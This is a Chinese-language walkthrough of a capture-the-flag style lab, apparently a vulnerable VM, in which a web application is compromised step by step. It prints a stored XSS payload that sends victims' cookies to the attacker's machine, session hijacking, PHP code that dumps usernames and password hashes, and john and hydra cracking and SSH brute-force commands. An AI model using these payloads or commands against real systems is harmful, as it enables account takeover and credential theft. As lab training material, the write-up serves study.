一、环境

攻击机IP：192.168.1.37
目标机IP：192.168.1.3

二、实战

2.1、端口扫描


nmap -sV -p- 192.168.1.3



访问80端口HTTP服务


查看网页源码

找到了一个flag没有其他的什么信息

2.2、目录扫描

使用dirb扫描

dirb http://192.168.1.3

扫描出来的有用文件有

+ http://192.168.1.3/phpinfo.php (CODE:200|SIZE:47653)+ http://192.168.1.3/robots.txt (CODE:200|SIZE:1629)


访问http://192.168.1.3/phpinfo.php得到一个flag


访问http://192.168.1.3/robots.txt得到一个flag

2.3、漏洞发现

注册一个账号


注册账号后登录，在首页的文章下面可以进行评论，尝试是否存在XSS漏洞


成功弹窗

2.4、漏洞利用

存在XSS漏洞，我们可以利用该XSS漏洞来获取其他用户的session_id，然后利用得到的session_id登录他人的账户以获得更高的用户权限

在网页中我们可以看到有两个高管


在他们的帖子下面进行留言

<script>var request=new XMLHttpRequest();var redirect_url="http://192.168.1.37:8080/"+document.cookie;request.open("GET",redirect_url);request.send();</script>


在攻击机上开启临时web服务

python -m SimpleHTTPServer 8080


给史蒂夫发送邮件引导他查看文章


回到攻击机可以看到成功得到session_id


访问网站首页并使用burpsuite抓包将cookie更改为我们抓取到的cookie


成功以steve的身份登录


左上角选择添加文章，这里也需要抓包替换cookie不然的话我们后面的身份还是自己


在 input format 中选择 PHP code，并添加如下代码

<?php$result = db_query('select name,pass from users');while($record = db_fetch_object($result)){print $record->name . ":" . $record->pass . "<br/>";}?>


提交时同样需要替换cookie，提交后成功得到账户和密码的哈希值


使用john爆破密码

john -w=/usr/share/wordlists/rockyou.txt -form=raw-md5 password.txt


获取用户名，每一个用户在 user 目录下对应一个 ID


将得到的用户名和密码分别保存使用hydra进行爆破

hydra -L user.txt -P password.txt -t 4 ssh://192.168.1.3
